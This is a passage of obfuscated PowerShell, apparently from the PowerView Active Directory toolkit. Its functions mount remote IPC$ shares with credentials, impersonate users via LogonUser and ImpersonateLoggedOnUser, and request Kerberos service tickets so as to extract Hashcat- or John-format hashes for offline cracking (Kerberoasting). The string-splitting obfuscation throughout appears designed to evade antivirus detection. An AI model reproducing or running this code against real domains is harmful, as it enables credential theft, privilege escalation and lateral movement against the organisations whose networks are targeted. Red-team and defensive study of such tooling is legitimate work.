        if (${P`sBOu`NdP`ARAMeterS}[("{1}{0}{2}"-f'i','Doma','n')] -or (${ID`e`NtITy} -match ((("{3}{2}{0}{1}"-f'6','Yu6Y.+','+u','.'))  -REpLacE  'u6Y',[ChaR]92))) {
            if (${I`d`eNtiTy} -match ((("{3}{2}{0}{1}"-f 'x0','Ix.+','I','.+0'))-CrePlAce  ([cHaR]48+[cHaR]73+[cHaR]120),[cHaR]92)) {
                
                ${cOnveRTe`D`idENtI`TY} = ${Id`e`NTItY} | &("{1}{2}{0}{3}" -f 'A','Conve','rt-','DName') -OutputType ("{2}{0}{1}"-f'on','ical','Can')
                if (${ConVer`TedIDen`T`ITy}) {
                    ${C`oNnE`cTTarGeT} = ${C`O`NVEr`TE`dIdent`iTY}.("{2}{1}{0}" -f'tring','bS','Su').Invoke(0, ${c`onV`ErtEdI`dE`NtITY}.("{1}{0}"-f 'xOf','Inde').Invoke('/'))
                    ${O`Bj`EctidENtitY} = ${i`DeNtITY}.("{0}{1}"-f'Spli','t').Invoke('\')[1]
                    &("{0}{1}{3}{2}" -f 'Wr','it','erbose','e-V') ('[Ge'+'t-'+'Pri'+'nc'+'ip'+'alConte'+'xt] '+'Bi'+'nd'+'ing '+'to'+' '+'d'+'oma'+'in '+"'$ConnectTarget'")
                }
            }
            else {
                ${objecti`D`EN`Ti`Ty} = ${i`D`eNtITy}
                &("{1}{3}{2}{0}" -f 'Verbose','Wr','-','ite') ('[Get-Pr'+'i'+'nc'+'ipalContex'+'t] '+'Bind'+'in'+'g '+'t'+'o '+'domai'+'n '+"'$Domain'")
                ${C`ONnEcttA`RGet} = ${d`oM`Ain}
            }

            if (${P`SBouNDPARa`MET`ERs}[("{2}{1}{0}" -f 'ential','red','C')]) {
                &("{0}{3}{1}{2}"-f 'Write','bo','se','-Ver') ("{6}{11}{7}{5}{0}{9}{1}{12}{13}{4}{3}{2}{8}{10}" -f'i','lContext] Us','te ','na','er','Pr','[','et-','credent','ncipa','ials','G','ing',' alt')
                ${CO`NT`EXt} = &("{2}{0}{1}" -f'Obj','ect','New-') -TypeName ("{4}{3}{0}{9}{5}{1}{2}{10}{7}{6}{8}{11}"-f'.Directory','nage','men','stem','Sy','untMa','ipa','rinc','l','Services.Acco','t.P','Context') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::"do`maIn", ${coN`N`ect`T`ArgeT}, ${c`RedeN`TIAL}."user`NA`Me", ${Cr`e`De`NTial}.("{5}{0}{1}{3}{2}{4}"-f 'etNetw','o','Cred','rk','ential','G').Invoke()."paS`Sw`Ord")
            }
            else {
                ${C`Onte`xT} = &("{1}{0}{2}"-f'c','New-Obje','t') -TypeName ("{7}{4}{10}{3}{5}{12}{1}{11}{0}{6}{8}{2}{9}" -f'es.AccountManageme','e','ipalCon','irec','y','tory','n','S','t.Princ','text','stem.D','rvic','S') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::"DOMa`In", ${CONn`E`CTTARg`Et})
            }
        }
        else {
            if (${psBO`UNDPA`RA`mEterS}[("{2}{0}{1}"-f'rede','ntial','C')]) {
                &("{0}{3}{1}{2}{4}"-f'Wri','Verb','o','te-','se') ("{11}{8}{7}{5}{9}{1}{2}{6}{0}{12}{10}{4}{3}"-f 'si','nte','xt','als','nti','ncipalC','] U','Pri','t-','o','nate crede','[Ge','ng alter')
                ${DOM`A`In`NaME} = &("{1}{0}{2}" -f'-D','Get','omain') | &("{0}{1}{2}{3}"-f'S','elect-Ob','je','ct') -ExpandProperty ("{1}{0}" -f 'ame','N')
                ${cOnt`E`xT} = &("{1}{2}{0}"-f 'ect','New-Ob','j') -TypeName ("{4}{6}{0}{11}{14}{13}{5}{1}{15}{8}{17}{10}{2}{16}{9}{3}{12}{7}" -f'irect','c','ent.','ipa','Sys','.Ac','tem.D','xt','untMa','nc','m','or','lConte','rvices','ySe','o','Pri','nage') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::"dOma`IN", ${DOMa`I`NnAme}, ${cR`ED`EntiAl}."USE`Rn`Ame", ${CredENT`i`Al}.("{5}{0}{4}{3}{2}{1}"-f'e','ial','t','rkCreden','two','GetN').Invoke()."PASSw`ord")
            }
            else {
                ${c`ONt`EXT} = &("{2}{1}{0}{3}"-f'bjec','ew-O','N','t') -TypeName ("{2}{5}{15}{4}{0}{12}{3}{1}{9}{14}{6}{11}{8}{10}{7}{13}"-f 'rvice','ountManagemen','Sys','cc','rySe','tem.D','ri','tex','lC','t','on','ncipa','s.A','t','.P','irecto') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::"DOM`AIn")
            }
            ${oBj`EC`TIdeNTI`Ty} = ${iD`En`TItY}
        }

        ${O`UT} = &("{2}{1}{0}"-f 't','ec','New-Obj') ("{1}{0}" -f 'bject','PSO')
        ${O`Ut} | &("{1}{2}{0}" -f 'r','Add-','Membe') ("{1}{0}{2}{3}" -f'o','N','tep','roperty') ("{2}{0}{1}"-f 'nt','ext','Co') ${CO`Nt`exT}
        ${O`Ut} | &("{0}{1}{2}" -f'A','dd-Memb','er') ("{0}{3}{1}{2}"-f 'Not','p','erty','epro') ("{2}{0}{1}" -f'ent','ity','Id') ${O`BjecTiDENT`i`TY}
        ${O`Ut}
    }
    catch {
        &("{1}{0}{2}"-f'ri','W','te-Warning') ('[G'+'e'+'t-Prin'+'c'+'ipalC'+'ontex'+'t]'+' '+'Err'+'or '+'creatin'+'g'+' '+'b'+'indin'+'g '+'fo'+'r '+'objec'+'t '+"('$Identity') "+'context'+' '+': '+"$_")
    }
}


function adD-REmo`Tecon`N`ECti`on {


    [CmdletBinding(dEfAUltPARaMETErsetname = {"{0}{3}{1}{2}"-f'Computer','am','e','N'})]
    Param(
        [Parameter(POsitiOn = 0, mandaTOrY = ${tR`UE}, PArAMeTERsETNaMe = "CO`Mp`UTERNA`ME", ValUefRoMpIpeliNe = ${TR`UE}, VAlueFROmPipeLInebYProPerTynAmE = ${TR`Ue})]
        [Alias({"{1}{2}{0}" -f 'me','Hos','tNa'}, {"{2}{1}{0}" -f'tname','s','dnsho'}, {"{1}{0}"-f 'me','na'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${cOM`puTer`Na`Me},

        [Parameter(PosITioN = 0, parAMeTERsETNaMe = "p`ATH", MaNdaTOry = ${TR`UE})]
        [ValidatePattern({(("{0}{1}{3}{2}"-f'{0}{0}','{0}{0','.*','}.*{0}{0}'))  -f  [ChaR]92})]
        [String[]]
        ${pA`Th},

        [Parameter(mANdaTORy = ${Tr`Ue})]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRe`deNT`IAl}
    )

    BEGIN {
        ${N`eTR`EsOuRceiN`stanCE} =  (  ChiLDITem  ('v'+'Ari'+'AblE:'+'Em542')  )."VA`LUE"::("{1}{3}{0}{2}" -f'eate','C','Instance','r').Invoke(${N`E`T`R`esOurceW})
        ${n`Et`REsOUrcEi`N`s`T`ANCE}."D`wTY`pe" = 1
    }

    PROCESS {
        ${PA`THs} = @()
        if (${pS`BOUndP`ArA`mEtERS}[("{1}{2}{3}{0}"-f'ame','Comp','ut','erN')]) {
            ForEach (${tA`RG`e`TCOMPuT`eRNAME} in ${cOMPU`TE`R`NAme}) {
                ${taRget`CoM`pUteR`NAmE} = ${tARG`e`TCoMP`U`TE`RNamE}.("{0}{1}"-f 'Tri','m').Invoke('\')
                ${P`A`THS} += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            ${p`AtHs} += ,${pA`TH}
        }

        ForEach (${t`A`RGet`paTH} in ${P`AT`hs}) {
            ${Ne`TreSoURCe`i`N`STAncE}."lPR`e`MOTEName" = ${tA`RgEt`pa`Th}
            &("{3}{4}{1}{2}{0}" -f'se','te-Ve','rbo','Wr','i') ('['+'A'+'dd-Remote'+'Co'+'nnec'+'tion]'+' '+'Attempt'+'in'+'g '+'to'+' '+'mount'+': '+"$TargetPath")

            
            
            ${RE`SU`lt} = ${m`PR}::("{0}{1}{3}{2}"-f'WNe','t','Connection2W','Add').Invoke(${net`REs`OUr`CE`inS`TANce}, ${c`RedEnTi`Al}.("{3}{1}{4}{2}{0}" -f'l','twork','entia','GetNe','Cred').Invoke()."P`Asswo`Rd", ${Cre`D`E`NtIal}."Use`Rn`AME", 4)

            if (${r`eSULT} -eq 0) {
                &("{2}{1}{0}" -f'ose','ite-Verb','Wr') ("$TargetPath "+'succ'+'essfu'+'l'+'l'+'y '+'mou'+'nted')
            }
            else {
                Throw "[Add-RemoteConnection] error mounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message) "
            }
        }
    }
}


function ReMo`VE`-REM`oTE`cOnnE`ctION {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{8}{0}{11}{10}{2}{7}{6}{1}{9}{5}{4}"-f 'u','angi','rocessFor','PSUseS','unctions','F','eCh','Stat','ho','ng','P','ld'}, '')]
    [CmdletBinding(defauLTparAMEtERSETNAme = {"{3}{0}{2}{1}" -f 'mpute','e','rNam','Co'})]
    Param(
        [Parameter(POsitiOn = 0, maNDaTory = ${Tr`UE}, pArAMETeRSEtname = "c`O`mPUTE`RnaME", vaLUEfrOmpIpElIne = ${T`Rue}, vALuEfROMPIPEliNebyPRopertyNAMe = ${T`RUE})]
        [Alias({"{2}{0}{1}"-f 'am','e','HostN'}, {"{2}{3}{0}{1}"-f 'ostnam','e','dns','h'}, {"{0}{1}" -f 'na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${C`o`mputeRn`Ame},

        [Parameter(positiOn = 0, PARamETerSeTnAMe = "p`ATH", MAndATOry = ${tr`Ue})]
        [ValidatePattern({(("{0}{4}{5}{1}{3}{2}" -f 'O6R','RO','*','6RO6R.*O6RO6R.','O','6'))."R`eP`lAcE"('O6R',[strinG][chAr]92)})]
        [String[]]
        ${Pa`TH}
    )

    PROCESS {
        ${p`ATHS} = @()
        if (${psb`O`Und`pARAmete`RS}[("{1}{0}{3}{2}"-f 'e','Comput','e','rNam')]) {
            ForEach (${t`AR`GEtCOMpuTErn`AME} in ${COM`Pu`TERNaME}) {
                ${TaR`GETco`MP`U`T`erName} = ${ta`Rg`E`TcOMput`Erna`Me}.("{1}{0}"-f 'im','Tr').Invoke('\')
                ${p`ATHS} += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            ${Pa`THs} += ,${P`AtH}
        }

        ForEach (${t`ARGet`p`ATH} in ${PaT`Hs}) {
            &("{1}{0}{3}{2}"-f'e-Ver','Writ','ose','b') ('[Remove-Re'+'mo'+'t'+'eConnec'+'t'+'ion'+'] '+'Att'+'emptin'+'g'+' '+'t'+'o '+'unmou'+'n'+'t: '+"$TargetPath")
            ${r`e`SULT} = ${M`pR}::("{3}{5}{1}{0}{2}{4}" -f 'o','ancelC','nn','WNet','ection2','C').Invoke(${TarGE`Tp`A`TH}, 0, ${T`RuE})

            if (${Re`s`Ult} -eq 0) {
                &("{2}{1}{0}{3}"-f 'e','ite-V','Wr','rbose') ("$TargetPath "+'suc'+'cessf'+'ul'+'ly '+'u'+'mmounte'+'d')
            }
            else {
                Throw "[Remove-RemoteConnection] error unmounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message) "
            }
        }
    }
}


function invOk`e-uSEriM`pe`RSOn`ATIOn {


    [OutputType([IntPtr])]
    [CmdletBinding(DeFAuLTParAmEtERSETName = {"{2}{0}{1}"-f 'den','tial','Cre'})]
    Param(
        [Parameter(MANDaTORy = ${Tr`Ue}, paRAmeTErSEtnAmE = "cRe`den`T`IAL")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`ED`eNTiAl},

        [Parameter(mAnDaTORY = ${TR`UE}, paraMeTeRSetNaME = "To`kenHAND`LE")]
        [ValidateNotNull()]
        [IntPtr]
        ${To`kEn`han`DLe},

        [Switch]
        ${Qu`IET}
    )

    if (( ${wg`5`TH}::"C`UrReNtT`hr`EAd".("{3}{1}{2}{0}" -f 'tmentState','Apa','r','Get').Invoke() -ne 'STA') -and (-not ${pSB`oUND`PaRam`ETErs}[("{1}{0}" -f 'et','Qui')])) {
        &("{2}{3}{1}{0}" -f 'ng','i','Write-War','n') ("{28}{24}{32}{33}{35}{1}{16}{31}{18}{38}{0}{13}{14}{19}{3}{5}{20}{21}{36}{26}{2}{11}{12}{34}{9}{25}{4}{17}{6}{23}{8}{22}{15}{7}{29}{30}{37}{10}{27}"-f'wersh','tio','d ','tly in ','te, ','a single-','ke','a','mpe',' ','t w','apar','tmen','ell.exe is not',' curre','on','n]','to','p','n','t','hrea','rs','n i','Invoke-Us','sta','e','ork.','[','tion m','ay',' ','e','rImpers','t','ona','d',' no','o')
    }

    if (${PSb`OUndp`ARaMete`Rs}[("{2}{1}{0}" -f'andle','nH','Toke')]) {
        ${lOg`OnTo`k`EnHandlE} = ${ToKE`N`hAndLE}
    }
    else {
        ${L`OGONt`O`kEnh`ANDle} =   ${KEG`sB}::"Z`eRo"
        ${n`Etw`oRk`CRedENtIal} = ${crEde`Nti`Al}.("{2}{3}{5}{0}{4}{6}{1}" -f'w','Credential','G','etNe','or','t','k').Invoke()
        ${Us`erdOm`A`IN} = ${N`EtWO`RkC`R`eD`entIal}."dOma`iN"
        ${u`S`eR`NaME} = ${N`eTwOr`KCrE`DE`N`Tial}."U`sER`NaMe"
        &("{2}{0}{1}" -f 'ite-','Warning','Wr') "[Invoke-UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName) "

        
        
        ${rEs`U`lt} = ${Ad`VAp`I`32}::("{1}{2}{0}" -f'r','L','ogonUse').Invoke(${u`se`R`Name}, ${User`D`Om`AiN}, ${Netw`OrKcrED`EN`TIaL}."Pa`S`swORD", 9, 3, [ref]${LO`g`onTOkE`NhAndLe});${l`A`STeRrOr} =   ( gEt-vARiaBLe ('7'+'0QuML') )."vaL`UE"::("{2}{0}{1}{4}{3}"-f'Last','Wi','Get','32Error','n').Invoke();

        if (-not ${RE`sulT}) {
            throw "[Invoke-UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
        }
    }

    
    ${resU`lT} = ${AD`VaP`i32}::("{3}{6}{7}{2}{5}{0}{4}{1}"-f'dOn','r','eLog','Im','Use','ge','person','at').Invoke(${L`ogoN`TO`k`EnHAN`dLe})

    if (-not ${re`s`UlT}) {
        throw "[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
    }

    &("{2}{3}{1}{0}" -f 'se','o','Writ','e-Verb') ("{12}{11}{4}{6}{8}{7}{2}{1}{9}{3}{5}{0}{13}{10}" -f'm','c','ials suc','lly','ke-UserImpersonation] A',' i','l','rnate credent','te','essfu','sonated','Invo','[','per')
    ${loGoNTo`kenhA`N`DlE}
}


function Inv`O`kE-`Rev`ErtTO`SE`lf {


    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        ${tOkeN`h`An`dLe}
    )

    if (${P`SbOU`N`DParameT`eRs}[("{2}{0}{1}" -f'nHandl','e','Toke')]) {
        &("{0}{2}{3}{1}{4}" -f 'Wr','Wa','i','te-','rning') ("{18}{21}{20}{17}{7}{12}{11}{25}{2}{10}{24}{5}{0}{22}{19}{16}{1}{8}{15}{3}{9}{6}{23}{13}{26}{14}{4}" -f 'tok','on','ve','L','le','g ','o','rtT',' and closin','og','rt','Sel','o','()','token hand','g ','personati','eve','[Invok','n im','R','e-','e','nUser','in','f] Re',' ')
        ${Res`ULT} = ${K`eRNel`32}::("{0}{2}{3}{1}" -f'C','e','l','oseHandl').Invoke(${TO`KENhA`N`dlE})
    }

    ${r`E`suLT} = ${AdV`API32}::("{3}{2}{0}{1}"-f'vert','ToSelf','e','R').Invoke();${lA`S`TeRROR} =  (iTEM  ('VArIA'+'B'+'Le:'+'70'+'qUmL')  )."Va`lue"::("{1}{2}{0}{3}" -f'2Er','GetLastW','in3','ror').Invoke();

    if (-not ${R`esU`lT}) {
        throw "[Invoke-RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
    }

    &("{1}{0}{2}"-f 'e-Ve','Writ','rbose') ("{3}{6}{10}{16}{12}{1}{13}{11}{9}{15}{2}{7}{0}{8}{4}{14}{5}"-f'so','Sel','impe','[Invo','ccessfull','verted','ke','r','nation su','ke','-Re','To','o','f] ','y re','n ','vertT')
}


function geT`-`dOmaINsp`NTICKEt {


    [OutputType({"{2}{3}{0}{4}{5}{1}"-f '.','NTicket','PowerV','iew','S','P'})]
    [CmdletBinding(DeFaultPaRamEtErSEtNAmE = {"{1}{0}"-f'SPN','Raw'})]
    Param (
        [Parameter(POSiTiOn = 0, pARaMetErSETNaME = "raW`SPN", mandaTorY = ${T`RuE}, VAluEfrOMPIpelInE = ${Tr`Ue})]
        [ValidatePattern({"{0}{1}"-f '.*','/.*'})]
        [Alias({"{5}{4}{3}{1}{0}{2}" -f 'ipa','c','lName','ePrin','ervic','S'})]
        [String[]]
        ${S`PN},

        [Parameter(poSition = 0, PaRaMeterSeTNAME = "US`eR", MaNDATory = ${tR`UE}, vAluefRoMpIPELIne = ${tr`UE})]
        [ValidateScript({ ${_}."p`S`oBject"."TY`PeNA`mEs"[0] -eq ("{2}{0}{1}" -f'ie','w.User','PowerV') })]
        [Object[]]
        ${U`Ser},

        [ValidateSet({"{1}{0}" -f 'ohn','J'}, {"{1}{2}{0}"-f't','Hashc','a'})]
        [Alias({"{1}{0}"-f'rmat','Fo'})]
        [String]
        ${Ou`TpuTF`O`RMAt} = ("{1}{2}{0}"-f't','H','ashca'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`R`EdENtiAl} =   (  Gci ("{0}{1}{2}"-f 'VA','rIABLe',':QfN') )."val`UE"::"e`mPtY"
    )

    BEGIN {
        ${nu`lL} =  (gI  ("{0}{1}{3}{2}"-f 'V','ARIablE:','iC','b')  )."V`ALUe"::("{4}{0}{1}{2}{3}" -f'oadWithPar','ti','a','lName','L').Invoke(("{3}{1}{0}{2}{4}"-f'ntity','e','Mo','System.Id','del'))

        if (${pSBOUndpa`RA`ME`TerS}[("{1}{2}{0}{3}"-f'en','C','red','tial')]) {
            ${L`OGO`N`ToKEN} = &("{4}{1}{2}{5}{0}{3}" -f 'tio','Imperso','n','n','Invoke-User','a') -Credential ${crEd`eNtI`Al}
        }
    }

    PROCESS {
        if (${PSb`oUn`d`pA`RAmetERs}[("{1}{0}"-f'ser','U')]) {
            ${T`ArgETOBJ`Ect} = ${U`SER}
        }
        else {
            ${taRGE`Tob`JecT} = ${S`pN}
        }

        ForEach (${O`BJE`Ct} in ${tArG`eT`obj`ecT}) {
            if (${PSBou`NDpARam`E`TE`RS}[("{1}{0}"-f 'r','Use')]) {
                ${uSE`R`Spn} = ${oB`JEcT}."SERVI`CEpri`N`cIp`AL`Na`mE"
                ${SaMAC`couN`TN`AME} = ${o`BjEcT}."sAMAcCO`Un`TNAme"
                ${DIs`TiNg`U`iSH`e`DnaMe} = ${o`BjeCt}."DiSTINGuish`e`D`NAMe"
            }
            else {
                ${uSers`PN} = ${Ob`jEcT}
                ${SAM`ACC`o`UnTnA`Me} = ("{0}{1}"-f 'U','NKNOWN')
                ${DIs`Ting`UIShedna`ME} = ("{1}{0}"-f 'OWN','UNKN')
            }

            
            if (${use`RS`pN} -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                ${Us`E`RSPN} = ${uS`ErS`pn}[0]
            }

            try {
                ${TIc`K`eT} = &("{1}{0}{2}"-f '-Obj','New','ect') ("{2}{0}{8}{6}{13}{7}{3}{1}{4}{9}{12}{5}{11}{10}"-f 'y','b','S','Tokens.Ker','ero','y','dentityMod','.','stem.I','sRe','oken','T','questorSecurit','el') -ArgumentList ${uSe`Rspn}
            }
            catch {
                &("{1}{2}{3}{4}{0}" -f'g','W','r','ite-Warn','in') ('[Get-Domain'+'SPN'+'Ti'+'c'+'ket] '+'E'+'rro'+'r '+'req'+'ues'+'tin'+'g '+'tic'+'k'+'et '+'for'+' '+'S'+'PN '+"'$UserSPN' "+'from'+' '+'user'+' '+"'$DistinguishedName' "+': '+"$_")
            }
            if (${ti`ckeT}) {
                ${tiCketB`Y`T`ES`TRe`Am} = ${ti`C`ket}.("{3}{2}{1}{0}" -f't','ues','tReq','Ge').Invoke()
            }
            if (${t`ICKEt`B`Y`TESTR`eaM}) {
                ${O`Ut} = &("{1}{2}{0}" -f'bject','New','-O') ("{1}{0}" -f 'ct','PSObje')

                ${T`IckEtHEX`stR`eAm} =   (Item  ("VariaBl"+"e"+":"+"Qt5l"+"w"))."VA`LuE"::("{0}{2}{1}"-f 'ToStri','g','n').Invoke(${tiCkE`T`BYT`estRE`Am}) -replace '-'

                ${O`Ut} | &("{0}{1}{2}"-f'Add','-Memb','er') ("{1}{2}{0}"-f 'roperty','N','otep') ("{3}{2}{0}{1}" -f 'mAccoun','tName','a','S') ${saMaCCou`N`Tn`Ame}
                ${o`Ut} | &("{0}{2}{1}"-f 'Add','ember','-M') ("{0}{2}{1}{3}"-f'Notep','p','ro','erty') ("{2}{0}{4}{1}{3}" -f 'sti','guishedNa','Di','me','n') ${Dis`T`iNGuIShEdnA`me}
                ${O`UT} | &("{0}{2}{1}" -f'Add','er','-Memb') ("{0}{2}{1}" -f 'Notepro','y','pert') ("{3}{2}{1}{0}" -f'lName','rincipa','viceP','Ser') ${TIc`Ket}."SErV`iCEPr`In`c`iPALNAMe"

                
                
                if(${t`iCkeThEx`StR`EaM} -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    ${ETY`Pe} =  ( VaRiaBLE ("L8"+"f") -vALueon )::("{1}{0}"-f 'e','ToByt').Invoke( ${M`A`TcHeS}."ETy`Pe`len", 16 )
                    ${cIPHe`R`Te`xTLEN} =   (  CHIlDItem ("{0}{1}{2}{3}"-f 'VAR','IA','Bl','e:L8F') )."v`ALue"::("{1}{0}" -f 'oUInt32','T').Invoke(${MAtC`H`eS}."ciPHeR`T`eXtl`En", 16)-4
                    ${C`iphE`Rt`exT} = ${MaTch`ES}."D`A`TAtOeND".("{0}{1}{2}"-f 'Sub','s','tring').Invoke(0,${Ci`PherT`Ext`len}*2)

                    
                    if(${maTC`hEs}."Da`TATO`eND".("{1}{0}{2}{3}"-f'st','Sub','rin','g').Invoke(${CI`phertEXT`l`eN}*2, 4) -ne ("{0}{1}" -f 'A4','82')) {
                        &("{1}{3}{4}{0}{2}"-f'in','Wr','g','ite','-Warn') "Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq "
                        ${HA`sh} = ${NU`ll}
                        ${o`Ut} | &("{2}{1}{0}"-f 'ember','d-M','Ad') ("{0}{2}{1}{3}"-f 'No','epr','t','operty') ("{1}{3}{0}{2}" -f'tB','Tick','yteHexStream','e') (  ${6u`M`OD}::("{1}{2}{0}" -f 'ing','ToS','tr').Invoke(${t`ickETByTe`StrE`Am}).("{0}{1}" -f'R','eplace').Invoke('-',''))
                    } else {
                        ${h`Ash} = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
                        ${o`UT} | &("{2}{3}{1}{0}" -f'r','be','Add-Me','m') ("{1}{0}{2}" -f 'tepro','No','perty') ("{1}{2}{0}{3}" -f'HexS','TicketBy','te','tream') ${n`ULl}
                    }
                } else {
                    &("{0}{2}{3}{1}"-f'W','ing','rite-','Warn') "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq "
                    ${ha`Sh} = ${n`ULl}
                    ${O`Ut} | &("{2}{0}{1}"-f'd','-Member','Ad') ("{0}{2}{1}" -f 'Note','ty','proper') ("{1}{0}{2}{4}{3}"-f 'icke','T','tBy','eHexStream','t') ( (VarIabLe  ("{0}{1}" -f '6um','od') -ValUeo  )::("{1}{0}{2}"-f 'oStrin','T','g').Invoke(${tiC`K`eTBY`TeStREAM}).("{0}{1}"-f'Rep','lace').Invoke('-',''))
                }

                if(${H`Ash}) {
                    
                    if (${ou`TPUTfo`Rmat} -match ("{1}{0}" -f'ohn','J')) {
                        ${hA`SH`FormAt} = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
                    }
                    else {
                        if (${dI`stingU`IshE`d`N`Ame} -ne ("{0}{1}" -f'UNKN','OWN')) {
                            ${usERD`Oma`In} = ${di`StI`NguisHednA`ME}.("{1}{0}{2}"-f'Str','Sub','ing').Invoke(${DiST`Ing`U`I`s`heDnAme}.("{1}{2}{0}" -f 'Of','Inde','x').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            ${use`RdO`MAIn} = ("{1}{0}" -f 'NKNOWN','U')
                        }

                        
                        ${hash`FO`RmAt} = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                    }
                    ${O`Ut} | &("{0}{2}{1}" -f'Ad','-Member','d') ("{0}{1}{3}{2}"-f'Notep','r','rty','ope') ("{1}{0}" -f 'sh','Ha') ${h`ASh`FOrmaT}
                }

                ${O`UT}."P`S`oBjECT"."TyPE`NAm`ES".("{1}{0}" -f 'rt','Inse').Invoke(0, ("{3}{4}{0}{2}{1}{5}"-f'View.SP','ck','NTi','Powe','r','et'))
                ${O`Ut}
            }
        }
    }

    END {
        if (${LOgo`N`TO`KEN}) {
            &("{4}{3}{2}{0}{1}" -f 'e','vertToSelf','R','oke-','Inv') -TokenHandle ${lo`go`N`Token}
        }
    }
}


function InVOk`E`-`KERbERoaSt {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{1}{0}"-f 's','es','PSShould','Proc'}, '')]
    [OutputType({"{1}{0}{3}{2}"-f 'owerView.SPNT','P','ket','ic'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsItIoN = 0, vAluEfrOMpiPeliNe = ${t`RuE}, VAluEFrOmPiPeLINeBypROpErTynAme = ${tR`UE})]
        [Alias({"{3}{0}{4}{2}{1}" -f't','e','nguishedNam','Dis','i'}, {"{1}{0}{2}" -f 'a','SamAccountN','me'}, {"{0}{1}" -f'Na','me'}, {"{5}{4}{1}{2}{3}{0}"-f'ame','mbe','rDistingu','ishedN','e','M'}, {"{1}{2}{0}"-f'e','MemberN','am'})]
        [String[]]
        ${I`DeNTi`TY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${do`MA`In},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'ilter','F'})]
        [String]
        ${LdAp`FiL`T`eR},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}" -f 'DSPa','A','th'})]
        [String]
        ${s`Ear`c`hBAse},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{5}{0}{2}{4}{3}"-f'a','D','i','ntroller','nCo','om'})]
        [String]
        ${S`ErV`Er},

        [ValidateSet({"{0}{1}"-f 'B','ase'}, {"{0}{1}"-f 'O','neLevel'}, {"{1}{0}"-f'tree','Sub'})]
        [String]
        ${sea`Rc`HSCo`pE} = ("{0}{1}"-f 'Sub','tree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${Re`s`U`ltPAgeSize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SERvERT`i`Meli`MiT},

        [Switch]
        ${t`oMB`STONe},

        [ValidateSet({"{1}{0}" -f'hn','Jo'}, {"{1}{0}"-f 'cat','Hash'})]
        [Alias({"{1}{2}{0}" -f 't','Form','a'})]
        [String]
        ${o`UTP`U`TFoRmAt} = ("{1}{0}" -f 'shcat','Ha'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`edEn`Ti`Al} =  ${q`FN}::"EM`ptY"
    )

    BEGIN {
        ${Us`ersEa`RcHErARGu`m`eNTS} = @{
            'SPN' = ${Tr`Ue}
            ("{0}{2}{1}{3}"-f'Pro','e','perti','s') = ("{5}{10}{6}{2}{9}{8}{0}{4}{11}{1}{7}{3}" -f'vi','p','stinguishe','e','cepr','sa','me,di','alnam','r','dname,se','maccountna','inci')
        }
        if (${p`sbou`NdPaRaM`eT`ErS}[("{2}{0}{1}" -f'm','ain','Do')]) { ${Us`erSEA`R`CHERARg`UMeN`TS}[("{0}{1}"-f'Dom','ain')] = ${D`o`maiN} }
        if (${Psb`o`U`NDp`ARAMeTers}[("{0}{1}{3}{2}" -f 'LDAPF','i','r','lte')]) { ${usE`RsEa`RC`HeRarGU`MenTs}[("{0}{1}{2}" -f 'LDAP','Filte','r')] = ${LDa`PfiLt`eR} }
        if (${p`SbOUndP`A`RA`mEtERS}[("{2}{0}{1}"-f'rchBas','e','Sea')]) { ${Us`E`RS`ea`RchERA`RGumeNTs}[("{0}{3}{1}{2}"-f 'Sea','h','Base','rc')] = ${SEaRCH`B`A`Se} }
        if (${psBo`UNdPaR`A`mE`TERs}[("{1}{0}" -f 'erver','S')]) { ${uSerSEaRCheR`A`Rg`UMEN`TS}[("{1}{0}" -f'erver','S')] = ${SE`R`Ver} }
        if (${P`SB`oUn`dpar`AMETE`Rs}[("{0}{2}{1}" -f 'Sear','pe','chSco')]) { ${u`s`erSeaR`Che`R`ArGum`ents}[("{0}{2}{3}{1}"-f 'Sear','e','ch','Scop')] = ${se`Archs`coPE} }
        if (${ps`BoUNdp`ArAmET`Ers}[("{0}{4}{2}{1}{3}" -f 'Resul','i','eS','ze','tPag')]) { ${uS`e`RS`eaR`cHeraRg`UmentS}[("{2}{1}{0}"-f 'geSize','tPa','Resul')] = ${r`esULtpAg`E`si`ze} }
